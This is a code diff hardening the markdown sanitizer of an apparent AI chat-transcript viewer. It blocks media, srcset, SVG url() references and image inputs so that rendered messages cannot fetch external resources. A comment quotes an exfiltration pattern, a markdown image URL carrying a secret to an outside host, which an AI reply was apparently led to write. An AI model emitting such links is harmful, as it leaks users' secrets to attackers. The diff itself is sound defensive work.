@@ -8787,9 +8787,14 @@ const toolName = n => {
     if (!hasMd) return { html: mdFallback(t), cls: '' };
     let html;
     // No styles and no forms in a transcript (2026-10-03): a <style> after a word, or a style= on a block, restyled or
-    // covered the whole board while the chat was open. Task lists keep their (disabled) checkboxes.
-    try { html = DOMPurify.sanitize(marked.parse(String(t ?? '')), { FORBID_TAGS: ['style', 'form', 'button', 'textarea', 'select'], FORBID_ATTR: ['style'] }); } catch { return { html: mdFallback(t), cls: '' }; }
+    // covered the whole board while the chat was open. Task lists keep their (disabled) checkboxes. Nor anything else
+    // that fetches on sight (2026-10-14): DOMPurify keeps media, a srcset, a poster, a background, an SVG <image>.
+    try { html = DOMPurify.sanitize(marked.parse(String(t ?? '')), { FORBID_TAGS: ['style', 'form', 'button', 'textarea', 'select', 'video', 'audio', 'source', 'track', 'picture', 'image', 'feimage', 'use'], FORBID_ATTR: ['style', 'srcset', 'poster', 'background'] }); } catch { return { html: mdFallback(t), cls: '' }; }
     const tpl = document.createElement('template'); tpl.innerHTML = html;
+    // an input is a task's checkbox or nothing (type=image fetches its src); an SVG attribute's url() points inside the
+    // message or nowhere (a fill, mask or clip-path at another document fetches it), and a CSS escape spells no url
+    for (const el of tpl.content.querySelectorAll('input:not([type="checkbox"])')) el.remove();
+    for (const el of tpl.content.querySelectorAll('svg, svg *')) for (const a of [...el.attributes]) if (/url\(\s*['"]?\s*[^\s'"#]|\\/i.test(a.value)) el.removeAttribute(a.name);
     // An image is fetched only if it is in the message itself (data:); one elsewhere is a link to it — a reply led to
     // write ![](https://somewhere/?q=<a secret>) had the board send the secret there on sight, which the drawer never did.
     for (const img of tpl.content.querySelectorAll('img')) {
